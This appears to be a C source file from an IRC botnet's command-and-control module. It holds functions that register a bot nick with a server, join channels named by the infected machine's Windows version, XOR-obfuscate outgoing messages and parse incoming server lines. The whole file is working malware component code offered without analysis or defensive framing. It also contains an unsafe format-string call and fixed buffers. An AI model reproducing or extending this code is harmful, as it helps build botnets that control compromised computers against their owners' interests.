

#include "..\bt1.h"

//Send ACTION To IRC Server
void irc_action(SOCKET bsock, char *szAction, char *szParameter)
{
	char szBuffer[IRCBUF];
	if (!szAction || !szParameter) return;

#ifndef NO_DEBUG
		printf("[DEBUG] Sending irc action, irc_action()...\n");
#endif

		sprintf(szBuffer, "%s %s\r\n", szAction, szParameter);
		send(bsock, szBuffer, strlen(szBuffer), 0);
		return;
}

//Close And Cleanup Socket
void irc_disconnect(SOCKET bsock, WSAEVENT event)
{

#ifndef NO_DEBUG
		printf("[DEBUG] Disconnecting from irc, irc_disconnect()...\n");
#endif

		shutdown(bsock, SD_BOTH);
		closesocket(bsock);
		WSACloseEvent(event);
//		WSACleanup();
		return;
}

//JOIN Channel
void irc_join(SOCKET bsock, char *szChannel, char *szChannelPassword, bool bOSChannel)
{
	char szChan[32], szBuffer[IRCBUF];

#ifndef NO_DEBUG
		printf("[DEBUG] Joining irc channel, irc_join()...\n");
#endif

		memset(szChan, 0, sizeof(szChan));
	if (bOSChannel)
	{
			get_os(szBuffer);
		if (strstr(szBuffer, "Windows 95") != NULL) sprintf(szChan, "#win95");
		else if (strstr(szBuffer, "Windows 98") != NULL) sprintf(szChan, "#win98");
		else if (strstr(szBuffer, "Windows ME") != NULL) sprintf(szChan, "#winme");
		else if (strstr(szBuffer, "Windows NT") != NULL) sprintf(szChan, "#winnt");
		else if (strstr(szBuffer, "Windows 2000") != NULL) sprintf(szChan, "#win2k");
		else if (strstr(szBuffer, "Windows XP") != NULL) sprintf(szChan, "#winxp");
		else if (strstr(szBuffer, "Windows 2003") != NULL) sprintf(szChan, "#win2k3");
	}
	else sprintf(szChan, szChannel);
		sprintf(szBuffer, "JOIN %s %s\r\n", szChan, szChannelPassword);
		send(bsock, szBuffer, strlen(szBuffer), 0);
		return;
}

//Send MSG To IRC Server
void irc_msg(SOCKET bsock, char *szAction, char *szDestination, char *szMessage)
{
	char szBuffer[IRCBUF];
	if (!szAction || !szDestination || !szMessage) return;

#ifndef NO_DEBUG
		printf("[DEBUG] Sending irc message, irc_msg()...\n");
#endif

#ifndef NO_CRYPTO
		xor(szMessage, xorkey);
#endif

		sprintf(szBuffer, "%s %s :%s\r\n", szAction, szDestination, szMessage);
		send(bsock, szBuffer, strlen(szBuffer), 0);
		return;
}

//Bot Info
void irc_userinfo(SOCKET bsock, char *szBotNick, char *szServer, char *szServerPassword)
{
	char szBuffer[IRCBUF];

#ifndef NO_DEBUG
		printf("[DEBUG] Sending info to ircd, irc_userinfo()...\n");
#endif

		sprintf(szBuffer, "PASS %s\r\n", szServerPassword);
		send(bsock, szBuffer, strlen(szBuffer), 0);
		Sleep(5000);
		sprintf(szBuffer, "NICK %s\r\n", szBotNick);
		send(bsock, szBuffer, strlen(szBuffer), 0);
		Sleep(5000);
		sprintf(szBuffer, "USER %s \"%s.com\" \"%s\" :%s\r\n", szBotNick, szBotNick, szServer, szBotNick);
		send(bsock, szBuffer, strlen(szBuffer), 0);
		return;
}

//Split Buffer
void line_parse(SOCKET bsock, WSAEVENT event, char *szBuffer)
{
	int i, length;
		length = strlen(szBuffer);
	for (i = 0; i < length; i++) 
	{
		if ((szBuffer[i] == '\r') || (szBuffer[i] == '\n')) 
		{
				szBuffer[i] = 0;
		}
	}
	while (szBuffer[0] != 0)
	{

#ifndef NO_DEBUG
			printf("%s\n", szBuffer);
#endif
			
			irc_parse(bsock, event, szBuffer);
			length = strlen(szBuffer) + 2;
			szBuffer += length;
			Sleep(10);
	}
		return;
}
